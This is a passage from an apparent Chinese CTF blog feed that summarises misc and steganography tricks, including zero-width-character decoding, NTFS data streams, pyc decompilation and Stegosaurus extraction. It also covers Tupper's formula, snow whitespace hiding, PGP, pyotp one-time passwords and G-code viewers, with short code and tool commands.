codelengthBinary, j++)&#123;<br>      result[j] = <span class="hljs-built_in">parseInt</span>(r.<span class="hljs-title function_">substr</span>(i, codelengthBinary), radix);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;)(<span class="hljs-variable language_">this</span>);<br><br><br><span class="hljs-keyword">var</span> s = unicodeSteganographer<br>s.<span class="hljs-title function_">setUseChars</span>(<span class="hljs-string">&#x27;\u200b\u200c\u200d\u200e\u200f&#x27;</span>);<br>s.<span class="hljs-title function_">decodeText</span>(<span class="hljs-string">&quot;我已经看见了，​​​​‎‏​​​​​‏​‍​​​​‏‍‌​​​​‏‍‏​​​​‎‏​​​​​‏‏‌​​​​‏‍‌​​​​‏‎‍​​​​‌‌‎​​​​‎‏‏​​​​‏‍‌​​​​‏‍​​​​​‏​‎​​​​‏‍‏​​​​‎‏‍​​​​‏‎‌​​​​‏‎‍​​​​‏‌‎​​​​‎‏‍​​​​‏‎‌​​​​‏​‌​​​‌​​​你呢？&quot;</span>)<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* 复制并使用代码请注明引用出处哦~</span><br><span class="hljs-comment">* Lazzaro @ https://lazzzaro.github.io</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="0x02-ntfs数据流隐写"><a href="#0x02-ntfs数据流隐写" class="headerlink" title="0x02 ntfs数据流隐写"></a>0x02 ntfs数据流隐写</h2><blockquote><p>NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息。————百度百科</p></blockquote><p>创建一个NTFS数据流<br><code>echo &quot;test&quot; &gt; 1.txt:2.txt</code></p><p>查看数据流<br>使用<code>NtfsStreamsEditor</code>(windows)工具或者<code>notepad</code>命令</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/ntfs.jpg"></p><h2 id="0x03-pyc文件反编译"><a href="#0x03-pyc文件反编译" class="headerlink" title="0x03 pyc文件反编译"></a>0x03 pyc文件反编译</h2><p>一般使用<code>uncompyle6</code></p><p><code>uncompyle6 test.pyc &gt; test.py</code></p><h2 id="0x04-pyc隐写"><a href="#0x04-pyc隐写" class="headerlink" title="0x04 pyc隐写"></a>0x04 pyc隐写</h2><p>Stegosaurus 是一款隐写工具，它允许我们在 Python 字节码文件( pyc 或 pyo )中嵌入任意 Payload</p><p>github项目说是<code>Python 3.6 or later</code>，但是实际使用发现只有Python3.6可以运行</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">python3 stegosaurus.py -x [pyc_file]<br></code></pre></td></tr></table></figure><p>有时候需要注意<code>magic number</code>的问题<br>python3.6以下magic number是12个字节；python3.7以上是16个字节</p><h2 id="0x05-Tupper自我指涉公式"><a href="#0x05-Tupper自我指涉公式" class="headerlink" title="0x05 Tupper自我指涉公式"></a>0x05 Tupper自我指涉公式</h2><p>塔珀自指公式是杰夫·塔珀（Jeff Tupper）发现的自指公式：此公式的二维图像与公式本身外观一样。<br>该公式是一种对存储在常量k 中的位图信息进行解码的通用方法 ，它实际上可以用来绘制任何其他图像。</p><p>该不等式的定义为：<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/Tupper.jpg"><br>其中 ⌊ ⌋ 表示楼层函数， mod 是模运算</p><p>根据k值不同，可以做出”任意”图像</p><p><a href="https://tuppers-formula.ovh/">Tupper’s Formula Tools</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Tuppers_Self_Referential_Formula</span>():<br>    k = <span class="hljs-number">4858450636189713423582095962494202044581400587983244549483093085061934704708809928450644769865524364849997247024915119110411605739177407856919754326571855442057210445735883681829823754139634338225199452191651284348332905131193199953502413758765239264874613394906870130562295813219481113685339535565290850023875092856892694555974281546386510730049106723058933586052544096664351265349363643957125565695936815184334857605266940161251266951421550539554519153785457525756590740540157929001765967965480064427829131488548259914721248506352686630476300</span><br>    <span class="hljs-comment"># 这里替换为你自己的K值</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">x, y</span>):<br>        d = ((-<span class="hljs-number">17</span> * x) - (y % <span class="hljs-number">17</span>))<br>        e = reduce(<span class="hljs-keyword">lambda</span> x, y: x * y, [<span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(-d)]) <span class="hljs-keyword">if</span> d <span class="hljs-keyword">else</span> <span class="hljs-number">1</span><br>        g = ((y // <span class="hljs-number">17</span>) // e) % <span class="hljs-number">2</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> &lt; g<br><br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k + <span class="hljs-number">16</span>, k - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        line = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">107</span>):<br>            <span class="hljs-keyword">if</span> f(x, y):<br>                line += <span class="hljs-string">&quot; ■&quot;</span><br>            <span class="hljs-keyword">else</span>:<br>                line += <span class="hljs-string">&quot;  &quot;</span><br>        <span class="hljs-built_in">print</span>(line)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    Tuppers_Self_Referential_Formula()<br></code></pre></td></tr></table></figure><h2 id="0x06-snow隐写"><a href="#0x06-snow隐写" class="headerlink" title="0x06 snow隐写"></a>0x06 snow隐写</h2><p>snow 隐写是在html嵌入隐写信息，它的原理是通过在文本文件的末尾嵌入空格和制表位的方式嵌入隐藏信息，不同空格与制表位的组合代表不同的嵌入信息。</p><p>snow加密的特征非常明显，它会生成大量的<code>20</code>，<code>09</code>，在预览的时候像雪花一样</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/snow.png"></p><p><a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html">snow在线</a></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">snow.exe -C -p password filename<br></code></pre></td></tr></table></figure><h2 id="0x07-whitespace"><a href="#0x07-whitespace" class="headerlink" title="0x07 whitespace"></a>0x07 whitespace</h2><p>white_space是一种编程语言<br>由”空格”，”回车”，”tab”组成</p><p><a href="https://vii5ard.github.io/whitespace/">whitespace ide</a></p><h2 id="0x08-PGP"><a href="#0x08-PGP" class="headerlink" title="0x08 PGP"></a>0x08 PGP</h2><blockquote><p>PGP 加密系统是采用公开密钥加密与传统密钥加密相结合的一种加密技术。它使用一对数学上相关的钥匙，其中一个（公钥）用来加密信息，另一个（私钥）用来解密信息。</p></blockquote><p>一般需要私钥文件<code>xxx.key</code>或<code>xxx.asc</code>，加密文件<code>xxx.pgp</code>和一个密码</p><p>PGPTool: <a href="https://pgptool.github.io/">https://pgptool.github.io/</a></p><p>例如[BSidesSF2019]bWF0cnlvc2hrYQ&#x3D;&#x3D;</p><p><code>Key ring-&gt;Import PGP Key-&gt;导入xxx.key-&gt;然后输入密码</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/pgp.jpg"></p><h2 id="0x09-otp"><a href="#0x09-otp" class="headerlink" title="0x09 otp"></a>0x09 otp</h2><p>有点偏向密码学，<a href="https://en.wikipedia.org/wiki/One-time_password">wiki</a></p><p>一次性密码（One Time Password，简称 OTP），又称 “一次性口令”，是指只能使用一次的密码。</p><p>OTP 的密钥是以 base32 的方式存储的</p><p>python中有一个<a href="https://pypi.org/project/pyotp/">pyotp库</a>可以处理它</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Time-based OTPs</span><br><span class="hljs-keyword">import</span> pyotp<br><span class="hljs-keyword">import</span> time<br><br>totp = pyotp.TOTP(<span class="hljs-string">&#x27;base32secret3232&#x27;</span>)<br>totp.now() <span class="hljs-comment"># =&gt; &#x27;492039&#x27;</span><br><br><br>totp.verify(<span class="hljs-string">&#x27;492039&#x27;</span>) <span class="hljs-comment"># =&gt; True</span><br>time.sleep(<span class="hljs-number">30</span>)<br>totp.verify(<span class="hljs-string">&#x27;492039&#x27;</span>) <span class="hljs-comment"># =&gt; False</span><br><br><br><span class="hljs-comment">#Counter-based OTPs</span><br><span class="hljs-keyword">import</span> pyotp<br><br>hotp = pyotp.HOTP(<span class="hljs-string">&#x27;base32secret3232&#x27;</span>)<br>hotp.at(<span class="hljs-number">0</span>) <span class="hljs-comment"># =&gt; &#x27;260182&#x27;</span><br>hotp.at(<span class="hljs-number">1</span>) <span class="hljs-comment"># =&gt; &#x27;055283&#x27;</span><br>hotp.at(<span class="hljs-number">1401</span>) <span class="hljs-comment"># =&gt; &#x27;316439&#x27;</span><br><br>hotp.verify(<span class="hljs-string">&#x27;316439&#x27;</span>, <span class="hljs-number">1401</span>) <span class="hljs-comment"># =&gt; True</span><br>hotp.verify(<span class="hljs-string">&#x27;316439&#x27;</span>, <span class="hljs-number">1402</span>) <span class="hljs-comment"># =&gt; False</span><br><br><br><br><span class="hljs-comment">#Generating a Secret Key</span><br>pyotp.random_base32()<br>pyotp.random_hex()<br></code></pre></td></tr></table></figure><h2 id="0x10-数控打印"><a href="#0x10-数控打印" class="headerlink" title="0x10 数控打印"></a>0x10 数控打印</h2><p>遇到<code>*.gcode</code>文件或者<code>3D打印gcode的命令</code>可以放到下面这两个网站解析</p><p><a href="https://ncviewer.com/">ncviewer</a><br><a href="https://gcode.ws/">gCodeViewer</a></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/misc/shukong.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;图片隐写&quot;&gt;&lt;a href=&quot;#图片隐写&quot; class=&quot;headerlink&quot; title=&quot;图片隐写&quot;&gt;&lt;/a&gt;图片隐写&lt;/h1&gt;&lt;h2 id=&quot;0x01-Exif信息隐藏&quot;&gt;&lt;a href=&quot;#0x01-Exif信息隐藏&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="misc" scheme="https://www.lewiserii.top/tags/misc/"/>
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="隐写术" scheme="https://www.lewiserii.top/tags/%E9%9A%90%E5%86%99%E6%9C%AF/"/>
    
  </entry>
  
</feed>
